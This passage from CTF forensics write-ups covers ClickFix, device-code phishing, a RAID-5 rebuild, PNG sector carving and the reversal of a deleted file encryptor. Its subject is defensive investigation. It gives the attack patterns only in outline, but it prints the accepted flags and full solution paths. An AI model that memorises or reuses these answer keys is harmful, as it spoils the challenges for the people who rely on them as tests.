2026-10-16 20:31:15  .../admin-dashboard?token=NVW-OPS-892-a7f39c2e
2026-10-21 04:31:31  .../admin-dashboard?token=NVW-OPS-739-a7f39c2e
2026-10-28 03:54:04  .../admin-dashboard?token=NVW-ADMIN-cl1ckf1xed
```

The two earlier `NVW-OPS-*` tokens belong to the operator's normal sessions (Login Data shows username
`ops06`). The `NVW-ADMIN-` token comes from the `admin` login that followed the credential dump, matching
the brief's "an administrator account was used." **Fragment 3: `cl1ckf1xed`**.

*5. Assemble.* Join the three fragments with `_`, in the brief's stage order. Fragment 2 already starts
with an underscore, so a single underscore separates each part:

```
CSCTF{f@k3_c@ptch@_r3@l_m@lw@r3_cl1ckf1xed}
```

The phrase reads "fake captcha, real malware, clickfixed," which supports and confirms the fragment order.

**Why it works**

This is the ClickFix ("fake CAPTCHA") pattern: a web page tells the victim to "verify they are human" by
pasting an attacker command into the Win+R Run dialog, which leaves a RunMRU registry entry. PowerShell
script-block logging (4104) preserves the full fetched script even though it was never written to disk, and
that script carries both the AnyDesk unattended-access password and the scheduled-task definition. The
attacker's later credential dump and admin login then surface in the Edge browser history that Hindsight
has already extracted. The brief's four stages map directly onto four KAPE artifact classes — RunMRU,
PowerShell 4104, Scheduled Tasks, Hindsight — and the ClickFix RunMRU entry rules out two of the three
laptops immediately.

**Validation / reproduction**

Each fragment came from a single field on which two artifacts agree: the scheduled task appears in both
event 106 and `Scheduled Tasks.csv`, and the admin login lines up with the `WEBBROWSERPASSVIEW.EXE` run in
the PECmd timeline. The joined phrase reads as English, which confirmed the ordering independently of the
submission.

Reproduction summary: unzip the three collections; `grep` for the C2 hostname to isolate OPS-NB-06; read
the RunMRU CSV for the ClickFix command; read the 4104 payload for the AnyDesk `--set-password` value
(fragment 1); read the `Scheduled Tasks.csv` Comment column for fragment 2; parse `Hindsight_output.xlsx`
for the `NVW-ADMIN-` token suffix (fragment 3); join with `_` in stage order.

Gotchas: the task name's characters after `Maitenance Check` render as ` , ` in event 106 but as `????` in
the schtasks CSV; the exact original bytes were not recovered and do not affect the flag. The `/config`
content is never read directly — that it equals `_r3@l_m@lw@r3` is inferred from `-Description
(Get-Data51)` together with the task's Comment field. The first two submissions returned `ratelimited`
because of team-wide pacing and were never judged; the same value was accepted on the third send.

### Code Red Freight

> Forensics · Medium · Marius Merai  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{D3VC0DE-R3L4Y_M4N1F3ST-L3AK_4}`

**Challenge**

Tarnovel Rail Freight's defence-consignment manifests are reaching an outside
mailbox and the dispatcher, Patti Fernandez, noticed nothing. The handout
`code_red_freight.zip` is a constructed incident built from sanitized Microsoft
Entra and Purview-style exports: an Entra audit log, interactive and
non-interactive sign-in logs, a Purview unified audit log (UAL) for Patti, and two
lure screenshots. The task is to identify three things — the device the adversary
controls, the inbox rule leaking manifests, and the number of files they
downloaded — and assemble them into the flag format
`CSCTF{<device_name>_<rule_name>_<download_count>}`.

**Approach / walkthrough**

*1. Unpack and read the lure.* Unzip flat (`unzip -o -j code_red_freight.zip`).
OCR the email screenshot:

```sh
tesseract email_phish.png - 2>/dev/null
```

An external "Jordan Smith" `<ragubarden@proton.me>` shares `Draft_Budget_v2.docx`
and asks Patti to confirm consignment figures before a "Friday sync". The
Review-Document link reads `https://5harepoint.cz/...` — a lookalike with the digit
`5` in place of the `S`. OCR the landing page:

```sh
tesseract devicecode_phish.png - 2>/dev/null
```

There is no fake password form. The page sends her to the *real*
`microsoft.com/devicelogin` and tells her to type the code `CXR7QK2WD`. That is
**device-code phishing**: the attacker starts a device-code sign-in on their own
machine, Microsoft hands them the user code, and whoever enters that code and signs
in (MFA included) grants the attacker's machine a session as themselves. So in the
logs we are hunting a `deviceCode` sign-in that did not come from Patti.

*2. Follow the lure through the mailbox audit.* The UAL's useful content is the JSON
in each row's `AuditData` column. Pull every record mentioning the phisher's
address or the shared filename, skipping background service records (`UserType 5`)
and system rows with no client IP, oldest first:

```
2026-10-29T15:01:27Z  MailItemsAccessed       198.51.100.24       read \Inbox
2026-10-29T15:05:03Z  SensitivityLabelApplied 198.51.100.24       Re: ... -> ragubarden@proton.me
2026-10-29T15:05:49Z  Send                    198.51.100.24       Re: ... -> ragubarden@proton.me
2026-10-29T15:13:59Z  MailItemsAccessed       20.190.139.168      read \Inbox
2026-10-29T15:15:01Z  MailItemsAccessed       20.190.139.168      read \Sent Items
2026-10-29T15:27:39Z  MailItemsAccessed       203.0.113.77        read \Sent Items
2026-10-29T15:28:57Z  New-InboxRule           203.0.113.77:17091  rule M4N1F3ST-L3AK  ForwardTo=ragubarden@proton.me
```

Reading top to bottom: Patti opens the lure from `198.51.100.24` and replies to the
phisher (she engaged). The mailbox is then read through Microsoft Graph from
`20.190.139.168`, a Microsoft-owned address. Finally a new address,
`203.0.113.77`, reads Sent Items and, just over a minute later, creates an inbox
rule `M4N1F3ST-L3AK` forwarding to the phisher. `203.0.113.77` is the suspect; the
next steps cross-check it.

*3. Find the device-code sign-in.* List interactive sign-ins in time order and
summarize the non-interactive ones per source IP. All of Patti's normal activity
comes from `198.51.100.24` (Bucuresti, RO) with no device ID. Four rows from
`203.0.113.77` (Montreal, CA) stand out:

```
15:04:52 203.0.113.77 CA Failure 50199 deviceCodeFlow   Microsoft Authentication Broker -> Device Registration Service
15:04:55 203.0.113.77 CA Success deviceCode deviceCodeFlow Microsoft Authentication Broker -> Device Registration Service
15:23:15 203.0.113.77 CA Success ... Primary refresh token 95caec44 My Apps -> Microsoft Graph
15:23:40 203.0.113.77 CA Success ... Primary refresh token 95caec44 One Outlook Web -> ...
```

The Authentication Broker signs in to the Device Registration Service with protocol
`deviceCode`, three minutes after Patti opened the email. The first attempt fails
with **50199** (the extra "are you trying to sign in?" confirmation); she confirms
(the full row shows MFA method "Mobile app notification" — she approved the push),
and it succeeds. Afterward the same address uses a Primary Refresh Token carrying a
new device ID `95caec44…`. The non-interactive summary agrees: 44 refreshes from
`203.0.113.77` between 15:04:59 and 15:29:51, flagged `deviceCodeFlow`, all tied to
that one device ID.

*4. Identify the attacker's device.* List every `Register device` activity in the
Entra audit log and see where each device ID reappears:

```
2026-10-28T07:12:03Z  Register device from 198.51.100.24  name=R3M0TE-W0RK-PC  id=3f8c1a7b-...
    sign-ins with this device ID: 0 ; unified audit records: 0
2026-10-29T15:05:03Z  Register device from 203.0.113.77   name=D3VC0DE-R3L4Y  id=95caec44-c8af-4786-976c-73bd33d9d143
    sign-ins with this device ID: 42 {'203.0.113.77': 42}
    unified audit records with this device ID: 69
```

Two devices are registered to Patti's account. `R3M0TE-W0RK-PC`, registered 28
October from her own address a day before the phish, never appears in another record
— a decoy (her own work PC). `D3VC0DE-R3L4Y` was registered at 15:05:03 from
`203.0.113.77`, **eight seconds** after the device-code success; its device ID
`95caec44-c8af-4786-976c-73bd33d9d143` is on all 42 attacker sign-ins, the Graph
mail reads from `20.190.139.168`, and the inbox rule. The device the adversary
controls is **`D3VC0DE-R3L4Y`**.

*5. Find the leaking rule.* Print every inbox-rule operation with all parameters.
Again there are two:

```
2026-10-28T07:34:27Z  New-InboxRule from 198.51.100.24  Name=Newsletters  MoveToFolder=Newsletters  StopProcessingRules=False
2026-10-29T15:28:57Z  New-InboxRule from 203.0.113.77:17091  device=95caec44-...  Name=M4N1F3ST-L3AK  ForwardTo=ragubarden@proton.me  StopProcessingRules=True
```

`Newsletters` was created by Patti and only files newsletters into a folder —
housekeeping, the second decoy. `M4N1F3ST-L3AK` was created from the attacker's
address and device, has no conditions (so it fires on every incoming message),
forwards to the phisher's mailbox, and sets `StopProcessingRules=True` so later
rules leave those messages alone. Patti still sees her mail normally while a copy of
every manifest goes out. The leaking rule is **`M4N1F3ST-L3AK`**.

*6. Count the downloads.* Summarize the file operations, then list only the real
downloads:

```
FileAccessed          8  ... (12:46 .. 13:43, Patti's own work)
FileDownloaded        4  2026-10-29T15:20:24 .. 15:21:36
FileModified          4  ...
FileUploaded          2  ...

15:20:24 203.0.113.77 Microsoft Teams  11550 B  .../Documents/Notes.docx
15:20:30 203.0.113.77 Microsoft Teams 291478 B  .../Investor Relations Meeting Presentation.pptx
15:20:49 203.0.113.77 Microsoft Teams 232076 B  .../Research and Development/aerialshot.jpg
15:21:36 203.0.113.77 Microsoft Teams 332341 B  .../benefits/.../Local Resource Guide.docx
```

Only four records are `FileDownloaded`, all from `203.0.113.77` within about 70
seconds (two from Patti's OneDrive, two from SharePoint team sites). The other
`File*` events are Patti's own edits hours earlier, and `MailItemsAccessed` reads
are not downloads — don't count either. The download count is **4**.

*7. Assemble the flag.* Every answer follows from one pivot: the IP behind the
successful device-code sign-in (`203.0.113.77`). From it: the device registered
(`D3VC0DE-R3L4Y`), the forwarding rule created (`M4N1F3ST-L3AK`), and its
`FileDownloaded` count (4). Names are written exactly as they appear in the logs:

```
CSCTF{D3VC0DE-R3L4Y_M4N1F3ST-L3AK_4}
```

**Why it works**

The OAuth device authorization grant lets a device with no browser ask Microsoft
for a short user code; whoever enters that code at `microsoft.com/devicelogin` and
signs in authorizes the device that asked. The attacker requested the code as the
Microsoft Authentication Broker, a client allowed to talk to the Device
Registration Service, so Patti's sign-in — MFA push included — handed over tokens to
join the attacker's own machine to the tenant. A joined device then gets a Primary
Refresh Token carrying the MFA claim and the device ID, a persistent foothold that
makes later sign-ins pass as "MFA satisfied by claim in the token." Because every
attacker action carries exactly one IP and one device ID, pivoting on those two
values cleanly separates the intrusion from Patti's own activity and from the
planted decoys (`R3M0TE-W0RK-PC`, the `Newsletters` rule, her earlier file edits).

**Validation / reproduction**

All three values came from the single pivot and were cross-checked across exports:
the device ID `95caec44…` links the registration, the 42 sign-ins, the Graph mail
reads, and the forwarding rule, and the four `FileDownloaded` records all share the
attacker's source IP. Accepted on first submission.

Reproduction, in short: OCR the two lures to recognize device-code phishing; in the
sign-in logs find the `deviceCode`/`Success` row and note its IP
(`203.0.113.77`); in the Entra audit log read the `Register device` from that IP
(`D3VC0DE-R3L4Y`); in the UAL read the `New-InboxRule` with `ForwardTo` from that IP
(`M4N1F3ST-L3AK`); count `FileDownloaded` records from that IP (4); format the flag.

Gotchas: there are deliberate decoys in each export — a second device, a second
inbox rule, and a batch of earlier file events — all from Patti's own Romanian
address; filter on the attacker IP/device, not on event type alone. Count only
`FileDownloaded`; `FileAccessed`/`FileModified`/`FileUploaded` and
`MailItemsAccessed` are not downloads. The display names carry leetspeak and must be
copied verbatim, including the hyphens, into the flag.

### Dawn Array

> Forensics · Medium · Chronos Security  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{dawn_12d6b2bf2703a884e970e2c4d0070c894c8cf53be91d44feabeb44e18c02eefb}
```

The form is `CSCTF{dawn_<64 lowercase hex>}`, where the hex is a SHA-256 the procedure defines.

**Tools used**

Codex (run under human guidance), which rebuilt the array, ran the DP-7 checker end to end, and submitted
the accepted flag. Tooling: a short Python md-superblock parser and RAID-5 rebuild, Sleuthkit `fls`/`icat`,
`sqlite3`, and a Python TCP-stream reassembler for the pcapng.

**Challenge**

Dispatch gateway E2 of the (fictional) Rovenqara Rail Continuity Authority issued conflicting
turnout-release records and was then powered off. Its staging volume sat on a four-member Linux md RAID-5
array; one member is lost and three raw members survive. The task is to rebuild the volume read-only, apply
the gateway's own dispatch procedure (stored on that volume) to find the controller-acknowledged release
witness, and report it in the form the procedure defines. The brief stresses that this is a constructed
case built on *real* md RAID-5, ext4, SQLite WAL, RFC 5424 and HTTP/1.1 — every layer is a genuine format
to parse.

`dawn-array.zip` holds three 40 MiB raw md members (`acq-1/2/3.raw`), a case sheet warning that the file
labels say nothing about array position, and a helper `tools/raid5_extract.py` that reads no metadata. The
helper's usage example uses a 64 KiB chunk, which is the wrong chunk size for this array.

**Approach / walkthrough**

*1. Geometry from the superblocks.* Each member carries an **md v1.2** superblock at byte offset 4096. A
short static `struct` parser (no challenge code run) reads the same geometry on all three members:

| Field | Offset | Value |
|---|---|---|
| magic | 0x00 | `0xa92b4efc` |
| level | 0x48 | 5 |
| layout | 0x4C | 2 = left-symmetric |
| chunksize | 0x58 | 64 sectors = 32,768 B |
| raid_disks | 0x5C | 4 |
| data_offset | 0x80 | 2048 sectors = 1 MiB |
| data_size | 0x88 | 79,872 sectors per member |

Each member's role comes from its `dev_number` (offset 0xA0), used as an index into the `dev_roles` table
(offset 0x100), which reads `[0, 0xffff, 2, 0xffff, 3, 0xffff, …]`. That gives acq-1 → role 0, acq-3 →
role 2, acq-2 → role 3, so **role 1 is the lost member**. The file numbering deliberately does not match
role order. Logical array size = `(4 - 1) × 79872 × 512` = **122,683,392 bytes**.

*2. Rebuild read-only.* The supplied reassembler's CLI was checked statically; during the event the solver
used its own left-symmetric de-striping loop instead. For each stripe the parity role is `N-1-(s mod N)`,
and the data roles follow it, wrapping around; role-1 chunks are rebuilt by XORing the other three members:

```python
N, C, OFF = 4, 32768, 1 << 20
for s in range(79872 * 512 // C):            # stripe index
    p = N - 1 - (s % N)                      # left-symmetric parity role
    for i in range(N - 1):
        r = (p + 1 + i) % N                  # data roles follow parity, wrapping
        chunk = member[r][OFF+s*C : OFF+(s+1)*C] if r != 1 else \
                xor(member[0], member[2], member[3] at the same offset)   # rebuild role 1
        out.write(chunk)
```

The output of 3 × 79,872 × 512 bytes shows the ext4 magic `53 ef` at image offset 0x438 and the volume
label `rrca-staging` at 0x478. The equivalent invocation of the supplied helper, if used, is:

```
python3 tools/raid5_extract.py --member 0:acq-1.raw --member 2:acq-3.raw --member 3:acq-2.raw \
  --member-count 4 --chunk-bytes 32768 --data-offset-bytes 1048576 \
  --array-bytes 122683392 --layout left-symmetric --output array.img
```

*3. Extract (no mount, no root).* `fls -r -p array.img` lists the volume; each file is pulled with `icat`:

| inode | path |
|---|---|
| 20 | `usr/share/doc/…dispatch-procedure.txt` — DP-7, revision 3 |
| 21 / 24 / 25 | `var/lib/rrca/dispatch.sqlite` + `-wal` + `-shm` — the ledger |
| 23 | `var/log/rrca/dispatch-gateway.syslog` — RFC 5424 gateway events |
| 22 | `var/log/rrca/controller-access.pcapng` — gateway↔controller HTTP/1.1 |

*4. Read DP-7.* It defines the ledger schema; the four syslog phases (`PREPARE_SENT → RESPONSE_OBSERVED →
READBACK_OBSERVED → COMMIT_WRITTEN`); the two-request HTTP grammar per cycle (`POST /v1/reservations` then
`GET /v1/readback`); rules Q1–Q5; and the witness format. A cycle qualifies only if all five rules hold —
Q1 pairs one ledger row with one record per phase on shared IDs, Q2 matches the POST and its 201 response
to the ledger, Q3 checks the response revision and nonce against the ledger and RESPONSE_OBSERVED, Q4
checks the HTTP readback and syslog READBACK_OBSERVED against the ledger, Q5 requires the phases in order.
The witness is `SHA-256("RRCA-DAWN-WITNESS-v1\n" + one line per qualifying cycle in ascending
gateway_seq)`, each line being
`cycle_id|request_id|prepare_revision|reservation_nonce|release_register|release_value\n`.

*5. Apply the WAL.* DP-7 says rows still in the WAL are part of the ledger. The base file alone has 95
rows. With the 134-frame WAL applied — the last frame is a commit and all checksums are valid — it has
128. We worked on copies so the evidence files were never modified:

```
sqlite3 "file:dispatch.sqlite?immutable=1" "select count(*) from cycles"   -> 95   (base only)
sqlite3 <copy with -wal/-shm>  "select count(*) from cycles"                -> 128  (WAL applied)
```

*6. Reassemble HTTP.* The pcapng holds **128 TCP connections** to the controller, with no retransmitted or
out-of-order segments. Each stream splits cleanly on `Content-Length` into exactly two requests and two
responses.

*7. Cross-check and hash.* Every ledger row was tested against the syslog and the HTTP exchange. The decoys
each break exactly one link: 29 have a response nonce that does not match the ledger / RESPONSE_OBSERVED,
28 a mismatched revision, 24 a mismatched HTTP readback, and 31 a mismatched syslog readback. **Sixteen
cycles pass all five rules** (gateway_seq `14, 15, 34, 35, 55, 69, 78, 79, 80, 83, 85, 87, 95, 103, 110,
117`), and their lines are hashed into the 64-hex witness:

```
12d6b2bf2703a884e970e2c4d0070c894c8cf53be91d44feabeb44e18c02eefb
```

Both the 95/33 row split and the 29/28/24/31 decoy breakdown were independently reproduced for this
write-up (rebuild the array, extract the ledger, parse the syslog and reassemble the 128 HTTP
connections, then evaluate Q1–Q5). The base SQLite file holds 95 rows; applying the 134-frame WAL (last
frame a commit) raises the count to 128, so 33 rows live only in the WAL. Classifying the 112
non-qualifying cycles by the single link each decoy breaks gives: **29** with a corrupted reservation
**response nonce** (the HTTP 201 response carries a nonce that disagrees with the ledger and the
RESPONSE_OBSERVED record; the wrong nonce also propagates into that cycle's HTTP readback), **28** with
a corrupted response **revision** (same single wire corruption, propagated into the readback), **24**
with a corrupted **HTTP readback** alone (the `release_register` field, response otherwise clean), and
**31** with a corrupted **syslog READBACK_OBSERVED** alone (the `release_value` field). 29+28+24+31+16 =
128, and the 16 clean cycles are seq 14,15,34,35,55,69,78,79,80,83,85,87,95,103,110,117 — the same set
whose witness hashes to the accepted flag.

**Why it works**

There are three layers of "looks committed but isn't." The file names lie about RAID order, so the role
mapping has to come from the superblock, not the labels. The base SQLite file hides 33 committed rows that
exist only in the WAL. And a 201 response or a COMMIT_WRITTEN record does not prove acknowledgement: the
witness counts only cycles where the ledger, the wire capture and the gateway log all agree on nonce,
revision, register and value. The decoys each break exactly one of those links, yet all of them look
committed.

**Validation / reproduction**

The rebuild was checked by the ext4 magic and label appearing at the expected offsets. The witness is 1,733
bytes: a 21-byte header plus 16 × 107-byte lines, matching DP-7's fixed field widths. Re-running Q1–Q5
independently for the write-up gave the same 16 cycles and the same hash, which equals `flag.txt`.

Reproduction summary: parse the three md superblocks for geometry and roles; de-stripe left-symmetric with
32 KiB chunks and a 1 MiB data offset, rebuilding role 1 by XOR; `fls`/`icat` the ext4; read DP-7; apply
the WAL to reach 128 ledger rows; reassemble the 128 HTTP connections by `Content-Length`; apply Q1–Q5 to
isolate the 16 qualifying cycles; SHA-256 the DP-7 witness string. Gotchas: ignore the helper's 64 KiB
example chunk (the real chunk is 32 KiB); always apply the WAL before counting rows. The first three
submissions came back `ratelimited` (platform pacing, never judged); the same single value was accepted on
the fourth send.

### Flotsam

> Forensics · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{flotsam_0e91019a8e70267f550895930247d088}`

**Challenge**

The voyage data recorder from MV Ortelia was lifted from the wreck. The capsule survived but the controller did not, so the flash was read chip-off: a raw byte-level dump, `recorder-sectors.img` (35,840 bytes), with no filesystem and no allocation tables. The bridge wrote a chart frame of the vessel's last fix as a PNG somewhere in that dump; the recovery key printed on that chart is the flag. The brief's warning, "a file that opens is not the same as a file that is whole," is the whole puzzle: a naive carve produces a file that a viewer still opens, but the rows that carry the key are wrong.

With the allocation map gone, the one structural fact left is the sector size. The recorder wrote in 512-byte sectors, so a file can only be split at sector boundaries. 35,840 bytes is exactly 70 sectors of 512, so the job is to find which sectors belong to the chart PNG and in what order.

**Approach**

*1. Map the sectors.* Classify each sector as zero (all null), text (all printable), or binary, merge neighbors of the same kind into runs, and note where known file signatures land. A short stdlib script does this:

```python
SECTOR = 512
data = open("recorder-sectors.img", "rb").read()
def kind(s):
    if not any(s): return "zero"
    if all(32 <= b < 127 or b in (9,10,13) for b in s): return "text"
    return "binary"
```

Run over the image, the map comes out as:

```
    0-2      3  text    $GPRMC,060000.00,A,4406.5886,N,02912.300...
   3-20     18  binary
     21      1  zero
  22-33     12  binary  JPEG start (FFD8) at 0x2c00; JPEG end (FFD9) at 0x42d6
     34      1  zero
  35-41      7  binary
  42-43      2  zero
  44-47      4  binary  PNG IEND chunk at 0x5e97 (sector 47)
  48-51      4  text    $GPRMC,060000.00,A,4410.2616,N,02824.795...
  52-67     16  binary  PNG signature at 0x6800 (sector 52)
  68-69      2  zero
```

Reading it: sectors 0-2 and 48-51 are NMEA `$GPRMC` GPS logs padded with newlines. Sectors 22-33 are a complete JPEG, FFD8 at 0x2c00 (sector 22 start) through FFD9 in sector 33: a small engine-room camera frame, a separate file and not the chart. The PNG signature starts at the top of sector 52 (0x6800 = 52 × 512), but the PNG's closing `IEND` chunk is back in sector 47, *before* the header. The PNG is not stored in one piece, so a contiguous carve from sector 52 cannot reach a real end.

*2. Size the PNG from its header.* The PNG header states the exact file length, which tells us how many sectors to collect. Dump 48 bytes at 0x6800:

```sh
xxd -s 0x6800 -l 48 recorder-sectors.img
```
```
00006800: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00006810: 0000 02f8 0000 0208 0802 0000 0094 d20d  ................
00006820: ad00 0058 6649 4441 5478 9ced dd77 7c53  ...XfIDATx...w|S
```

IHDR carries `00 00 02 f8` × `00 00 02 08` = 760 × 520, bit depth 8, color type 2 (RGB). The next chunk is an IDAT of `00 00 58 66` = 0x5866 = 22,630 bytes, its data starting with the zlib header `78 9c`. Assuming this is the only IDAT (step 3 confirms it, since the chunk inflates to the full image), the file is 8 (signature) + 25 (IHDR) + 12 + 22,630 (IDAT) + 12 (IEND) = **22,687 bytes = 45 sectors**.

The header run 52-67 is only 16 sectors, so 29 more sit elsewhere. The unclaimed binary runs are 3-20 (18), 35-41 (7) and 44-47 (4): exactly 29. Run 44-47 holds the `IEND` (its type field at 0x5e97 is followed by a 4-byte CRC, ending the PNG at 0x5e9f, 159 bytes into sector 47), so it goes last. That leaves the order of the three middle pieces open.

*3. Order the fragments with the PNG's own checks.* A PNG can validate itself without any external feedback. Each chunk ends with a CRC-32 over its type and data; the IDAT payload is a zlib stream ending in an Adler-32 checksum that must inflate to exactly `height × (1 + 3×width)` bytes for 8-bit RGB (one filter byte per row plus three bytes per pixel). Glue the header run to each of the six orderings of the three candidate runs and let the checks decide:

```python
import itertools, struct, zlib
head = sectors(52, 67)
pieces = {"3-20": sectors(3,20), "35-41": sectors(35,41), "44-47": sectors(44,47)}
idat_len = struct.unpack(">I", head[33:37])[0]          # 22630
raw_len  = 520 * (1 + 3*760)                             # 1,186,120
for order in itertools.permutations(pieces):
    blob = head + b"".join(pieces[n] for n in order)
    idat = blob[41:41+idat_len]
    crc_ok = zlib.crc32(b"IDAT"+idat) == struct.unpack(">I", blob[41+idat_len:45+idat_len])[0]
    try: inflated = len(zlib.decompress(idat))
    except zlib.error: inflated = None
    # keep the order where crc_ok and inflated == raw_len
```
```
760x520 RGB, IDAT 22630 bytes, PNG 22687 bytes, 1186120 bytes once inflated
52-67, 3-20, 35-41, 44-47  CRC ok   inflate: 1186120 bytes
52-67, 3-20, 44-47, 35-41  CRC bad  inflate: Error -3 ... incorrect data check
52-67, 35-41, 3-20, 44-47  CRC bad  inflate: Error -3 ...
52-67, 35-41, 44-47, 3-20  CRC bad  inflate: Error -3 ...
52-67, 44-47, 3-20, 35-41  CRC bad  inflate: Error -3 ...
52-67, 44-47, 35-41, 3-20  CRC bad  inflate: Error -3 ...
```

Exactly one order passes both checks: **52-67, 3-20, 35-41, 44-47**. The file starts near the end of the flash and wraps to the beginning, the way a recorder's ring buffer fills. A wrong order is not obviously broken at a glance, because the top of the chart always comes from the header run; only the bottom rows go bad, and that is exactly where the key is printed. Cutting the valid blob just after `IEND` gives the 22,687-byte `chart.png`.

*4. Read the recovery key.* Open `chart.png`: it shows the chart with a "LAST FIX" marker and a "RECOVERY KEY (transcribe exactly):" panel at the bottom. OCR it:

```sh
tesseract chart.png - 2>/dev/null
```
```
VDR CHART FRAME — RECOVERED
LAST FIX
RECOVERY KEY (transcribe exactly):
CSCTF{flotsam_0e91019a8e70267f550895930247d088}
MV ORTELIA - frame Ox1A4 - reconstructed from fragmented sectors
```

OCR mangles characters (it read the footer's `0x1A4` as `Ox1A4`), so pull the key with a strict regex that only accepts a lowercase 32-character hex tail, and cross-check it against the same panel read from an upscaled, inverted crop:

```sh
tesseract chart.png - 2>/dev/null | grep -oE 'CSCTF\{[a-z]+_[0-9a-f]{32}\}'
```
```
CSCTF{flotsam_0e91019a8e70267f550895930247d088}
```

**Why it works**

Losing the controller loses the map of which sectors belong to which file, but not the data in them. The PNG is still all there in 512-byte pieces, just out of order. Its header fixes the exact file length, so the number of sectors to find is known, and the unclaimed binary runs add up to exactly that. The chunk CRC-32, zlib's Adler-32 and the known inflated size turn "does this order look right" into a yes/no test that only one arrangement passes, so the reassembly needs no guessing and no submission feedback. A naive contiguous carve from sector 52 still "opens" because the top of the image comes from the header run, but the bottom rows, where the key is, are corrupt: the brief's "a file that opens is not the same as a file that is whole."

**Validation / reproduction**

Exactly one of the six orderings passed the IDAT CRC-32, the zlib Adler-32 inflate, and the inflated-size check; the other five failed both the CRC and the zlib check. The OCR'd key was regex-checked against the expected format and matched what is visible in the chart, with a second read from an upscaled, inverted crop confirming the hex. The flag was accepted on first submission.

Reproduction summary: (1) confirm 70 sectors; (2) map runs and spot the JPEG decoy at sector 22, the PNG signature at 0x6800 and the `IEND` at 0x5e97; (3) read IHDR for 760×520 and IDAT length 0x5866, giving a 22,687-byte / 45-sector file; (4) fix 52-67 first and 44-47 last, brute the six middle orders against CRC + inflate (only 52-67, 3-20, 35-41, 44-47 passes); (5) cut at `IEND` and OCR the key. Gotchas: the `.swp`-style temptation here is the sector order, not the extension; don't trust the contiguous carve because it renders; and sanitize OCR output with the hex regex rather than transcribing by eye.

### Ghost in the Historian

> Forensics · Medium · Mohamed Amine Mzoughi  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{xorshift_ghost_in_the_historian_d2c19434a637}
```

It is the `SAFETY_INTERLOCK_TOKEN` value from the recovered `grid_topology.cfg`.

**Tools used**

The Sleuth Kit (`fls`, `istat`, `icat`, `blkls`), `objdump` for static disassembly, and a ten-line Python
keystream script. Nothing from the image was executed and the image was never mounted.

**Challenge**

Someone encrypted a substation historian's configuration and then deleted the encryptor; the task is to
recover the original configuration's `SAFETY_INTERLOCK_TOKEN`. The brief (`README_FOR_RESPONDERS.md`) says
the volume was built for the exercise: the ext4 filesystem was created on 29 October, but the incident
records and the access/modification times were set to 2 October ("treat those different clocks according to
what each records"). It also says to treat recovered programs as data — do not run them, and do not mount
the image. We followed both rules.

The zip holds a monolithicFlat VMDK (`evidence.vmdk` descriptor + `evidence-flat.vmdk` data). The
descriptor maps a raw 64 MiB ext4 extent at offset 0 (`RW 131072 FLAT "evidence-flat.vmdk" 0`, label
`HISTORIAN01`, 4 KiB blocks), so the Sleuth Kit reads `evidence-flat.vmdk` directly, with no mount and no
conversion.

**Approach / walkthrough**

*1. Filesystem listing.* `fls -r -p evidence-flat.vmdk` lists three `.enc` files under `var/historian/`
(`grid_topology.cfg.enc` inode 28, `historian_cache.dat.enc` inode 22, `node_status.json.enc` inode 23),
`var/log/historian.log`, and three orphan (deleted) inodes 21, 24, 27. Only inode 27 has mode
`rwxr-xr-x`, so it is taken to be the deleted encryptor — but all three orphans show size 0 and no extents,
because ext4 clears the extent tree on delete. The binary cannot be recovered through the inode.

*2. PID and timeline.* `icat evidence-flat.vmdk 25` reads the log:

```
2026-10-02 04:13 historian_enc[2764964]: starting encryption sweep, target_dir=/var/historian
```

This gives the encryptor's PID, **2764964**, and the run time to the minute (formatted with
`gmtime_r`/`strftime`, so UTC). `istat` on inodes 28, 22, 23 shows identical Accessed and File Modified
times for all three: **04:13:05 UTC, epoch `1790914385`**, with zero nanoseconds. Their Inode Modified
(ctime) is the later 2026-10-29 volume-build date — the "different clocks" the brief describes. The 2
October a/mtime is the incident clock, which the encryptor set itself.

*3. Carve the binary.* The deleted inode no longer points to data, but the data blocks were not
overwritten. `blkls` dumps the unallocated blocks concatenated in order: a ransom note first, then an ELF
header (`\x7fELF`) in the next block. The ELF's own header gives its length,
`e_shoff (0x3148) + e_shnum (29) × e_shentsize (64) = 14,472 bytes`, carved with `dd`:

```
blkls evidence-flat.vmdk > unalloc.bin
dd if=unalloc.bin bs=4096 skip=512 | head -c 14472 > encryptor.elf
# SHA-256 56819e82de96aca21d925f9ce0104b8a10ec515882b34433ac343964cd541f6e
```

`file` reports a stripped, dynamically linked x86-64 PIE. Following the brief, it was never executed, only
read with `objdump -d/-R/-s` and `strings`.

*4. Static RE.* Imports (from `objdump -R`) include `time`, `getpid`, `scandir`, `strcmp`, `utime`,
`unlink`, `gmtime_r`, `strftime`. In `main`, the seed is built as:

```c
t   = time(NULL);                  // a copy is kept for later
pid = getpid();
seed = (pid == (uint32_t)t) ? 0xA5A5A5A5
                            : (uint32_t)((t ^ pid) * 0x9E3779B1);
```

(The constants appear as `movl $0xa5a5a5a5` at 0x1326 and `imull $0x9e3779b1` — the golden-ratio constant
— at 0x1331; the seed is stored in a `.bss` global.) `scandir` uses a comparator at 0x1740 that calls
`strcmp` on `d_name`, so files are processed in byte order: `grid_topology.cfg`, `historian_cache.dat`,
`node_status.json`. For each 4-byte block the code runs one xorshift32 step on the global state and XORs
the state's little-endian bytes into the block; a short final block uses only the bytes it needs:

```c
x ^= x << 13; x ^= x >> 17; x ^= x << 5;   // shll $0xd/shrl $0x11/shll $0x5 at 0x1553/155b/1563
```

The state is **not** reseeded per file — it carries over across all three. Each output then gets `utime()`
set to the *first* `time()` value (the seed time), and the plaintext is `unlink`ed. That `utime()` call is
why the exact seed second is recoverable: the log line alone is only accurate to the minute.

*5. Decrypt.* With `t = 1790914385` and `pid = 2764964`, `pid != (uint32)t`, so the fallback does not
apply and `seed = 0x40D8E565`. One keystream run across the three ciphertexts in `strcmp` order recovers
all three:

```python
import struct
t, pid = 1790914385, 2764964
s = 0xA5A5A5A5 if pid == (t & 0xffffffff) else ((t ^ pid) * 0x9E3779B1) & 0xffffffff
for f in ["grid_topology.cfg.enc", "historian_cache.dat.enc", "node_status.json.enc"]:  # inodes 28,22,23
    d, out = open(f, "rb").read(), bytearray()
    for i in range(0, len(d), 4):
